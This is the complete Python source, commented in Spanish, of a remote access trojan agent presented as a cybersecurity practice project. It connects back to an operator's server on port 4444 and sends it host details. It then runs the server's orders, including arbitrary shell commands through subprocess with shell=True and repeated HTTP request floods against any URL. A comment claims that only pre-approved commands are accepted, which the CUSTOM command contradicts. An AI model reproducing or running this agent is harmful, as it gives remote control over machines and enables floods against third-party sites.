#!/usr/bin/env python3
"""
Sistema RAT - Agente/Cliente
Para entornos de práctica controlados - Proyecto de Ciberseguridad
Ejecutar en equipos de prueba (conexión reversa al servidor)
"""

import socket
import json
import platform
import subprocess
import time
import os
import sys
from datetime import datetime

class RATAgent:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        
    def get_system_info(self):
        """Obtiene información del sistema"""
        try:
            import socket as sock
            return {
                'hostname': sock.gethostname(),
                'os': platform.system(),
                'os_version': platform.version(),
                'os_release': platform.release(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'python_version': platform.python_version()
            }
        except Exception as e:
            return {
                'hostname': 'Unknown',
                'os': platform.system(),
                'error': str(e)
            }
    
    def connect_to_server(self):
        """Establece conexión reversa con el servidor"""
        max_retries = 5
        retry_delay = 5
        
        for attempt in range(max_retries):
            try:
                print(f"[*] Intentando conectar a {self.server_host}:{self.server_port} (intento {attempt + 1}/{max_retries})...")
                
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_host, self.server_port))
                
                # Enviar información inicial del sistema
                sys_info = self.get_system_info()
                self.socket.send(json.dumps(sys_info).encode('utf-8'))
                
                print(f"[+] Conectado exitosamente al servidor")
                self.running = True
                return True
                
            except Exception as e:
                print(f"[-] Error de conexión: {e}")
                if attempt < max_retries - 1:
                    print(f"[*] Reintentando en {retry_delay} segundos...")
                    time.sleep(retry_delay)
                else:
                    print("[-] No se pudo conectar al servidor después de varios intentos")
                    return False
        
        return False
    
    def execute_ping(self, target):
        """Ejecuta comando PING a un objetivo"""
        try:
            # Determinar comando según SO
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', '4', target]
            else:
                cmd = ['ping', '-c', '4', target]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            output = result.stdout + result.stderr
            return {
                'status': 'success',
                'output': output,
                'return_code': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {
                'status': 'error',
                'output': 'Timeout ejecutando ping'
            }
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Error ejecutando ping: {str(e)}'
            }
    
    def execute_sysinfo(self):
        """Obtiene información detallada del sistema"""
        try:
            info = self.get_system_info()
            
            # Información adicional
            try:
                import psutil
                info['cpu_count'] = psutil.cpu_count()
                info['cpu_percent'] = psutil.cpu_percent(interval=1)
                info['memory_total'] = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
                info['memory_available'] = f"{psutil.virtual_memory().available / (1024**3):.2f} GB"
                info['memory_percent'] = psutil.virtual_memory().percent
                info['disk_usage'] = f"{psutil.disk_usage('/').percent}%"
            except ImportError:
                info['note'] = 'psutil no instalado - información limitada'
            
            output = "\n".join([f"{key}: {value}" for key, value in info.items()])
            
            return {
                'status': 'success',
                'output': output,
                'data': info
            }
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Error obteniendo información: {str(e)}'
            }
    
    def execute_http_test(self, url, num_requests):
        """Ejecuta prueba de carga HTTP"""
        try:
            import requests
            import time
            
            print(f"[*] Ejecutando prueba de carga: {num_requests} peticiones a {url}")
            
            successful = 0
            failed = 0
            total_time = 0
            response_times = []
            
            for i in range(num_requests):
                try:
                    start_time = time.time()
                    response = requests.get(url, timeout=10)
                    end_time = time.time()
                    
                    response_time = end_time - start_time
                    response_times.append(response_time)
                    total_time += response_time
                    
                    if response.status_code == 200:
                        successful += 1
                    else:
                        failed += 1
                    
                    if (i + 1) % 10 == 0:
                        print(f"  Progreso: {i + 1}/{num_requests}")
                
                except Exception as e:
                    failed += 1
            
            # Calcular estadísticas
            avg_time = total_time / num_requests if num_requests > 0 else 0
            min_time = min(response_times) if response_times else 0
            max_time = max(response_times) if response_times else 0
            
            output = f"""
Prueba de Carga Completada:
  URL: {url}
  Total de peticiones: {num_requests}
  Exitosas: {successful}
  Fallidas: {failed}
  Tiempo promedio: {avg_time:.3f}s
  Tiempo mínimo: {min_time:.3f}s
  Tiempo máximo: {max_time:.3f}s
  Tasa de éxito: {(successful/num_requests)*100:.2f}%
"""
            
            return {
                'status': 'success',
                'output': output,
                'data': {
                    'successful': successful,
                    'failed': failed,
                    'avg_time': avg_time,
                    'min_time': min_time,
                    'max_time': max_time
                }
            }
            
        except ImportError:
            return {
                'status': 'error',
                'output': 'Error: módulo requests no instalado. Instalar con: pip install requests'
            }
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Error ejecutando HTTP_TEST: {str(e)}'
            }
    
    def execute_custom_command(self, command):
        """Ejecuta un comando personalizado del sistema"""
        try:
            print(f"[*] Ejecutando comando personalizado: {command}")
            
            # Ejecutar comando del sistema
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Combinar stdout y stderr
            output = ""
            if result.stdout:
                output += "STDOUT:\n" + result.stdout
            if result.stderr:
                output += "\nSTDERR:\n" + result.stderr
            
            if not output.strip():
                output = f"Comando ejecutado. Código de retorno: {result.returncode}"
            
            return {
                'status': 'success' if result.returncode == 0 else 'error',
                'output': output,
                'return_code': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            return {
                'status': 'error',
                'output': 'Timeout ejecutando comando (30s)'
            }
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Error ejecutando comando: {str(e)}'
            }
    
    def process_command(self, command_data):
        """Procesa un comando recibido del servidor"""
        try:
            command = command_data.get('command', '').upper()
            params = command_data.get('params', {})
            
            print(f"\n[*] Comando recibido: {command}")
            
            # Comandos preaprobados solamente
            if command == 'PING':
                target = params.get('target', 'google.com')
                return self.execute_ping(target)
            
            elif command == 'SYSINFO':
                return self.execute_sysinfo()
            
            elif command == 'HTTP_TEST':
                url = params.get('url')
                num_requests = params.get('requests', 100)
                
                if not url:
                    return {
                        'status': 'error',
                        'output': 'URL no especificada'
                    }
                
                return self.execute_http_test(url, num_requests)
            
            elif command == 'EXIT':
                print("[!] Comando EXIT recibido. Desconectando...")
                self.running = False
                return {
                    'status': 'success',
                    'output': 'Agente desconectado'
                }
            
            elif command == 'CUSTOM':
                custom_command = params.get('command')
                
                if not custom_command:
                    return {
                        'status': 'error',
                        'output': 'Comando no especificado'
                    }
                
                return self.execute_custom_command(custom_command)
            
            else:
                return {
                    'status': 'error',
                    'output': f'Comando no reconocido: {command}'
                }
        
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Error procesando comando: {str(e)}'
            }
    
    def run(self):
        """Loop principal del agente"""
        if not self.connect_to_server():
            return
        
        print("[+] Agente activo. Esperando comandos del servidor...")
        
        try:
            while self.running:
                try:
                    # Recibir comando del servidor
                    data = self.socket.recv(4096).decode('utf-8')
                    
                    if not data:
                        print("[-] Servidor desconectado")
                        break
                    
                    command_data = json.loads(data)
                    
                    # Procesar comando
                    result = self.process_command(command_data)
                    
                    # Enviar respuesta
                    response = json.dumps(result)
                    self.socket.send(response.encode('utf-8'))
                    
                    if not self.running:
                        break
                
                except json.JSONDecodeError:
                    print("[-] Error decodificando comando")
                    continue
                except Exception as e:
                    print(f"[-] Error en loop principal: {e}")
                    break
        
        except KeyboardInterrupt:
            print("\n[!] Interrupción detectada")
        
        finally:
            self.disconnect()
    
    def disconnect(self):
        """Cierra la conexión con el servidor"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print("[+] Agente desconectado")


def main():
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║  Sistema RAT - Agente/Cliente                             ║
    ║  Para entornos de práctica controlados                    ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    # Configuración de conexión
    server_host = input("IP del servidor: ").strip()
    server_port = input("Puerto del servidor (Enter para 4444): ").strip() or '4444'
    
    if not server_host:
        print("[-] Debe especificar la IP del servidor")
        return
    
    try:
        server_port = int(server_port)
        
        agent = RATAgent(server_host, server_port)
        agent.run()
    
    except KeyboardInterrupt:
        print("\n[!] Interrupción detectada. Cerrando agente...")
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    main()
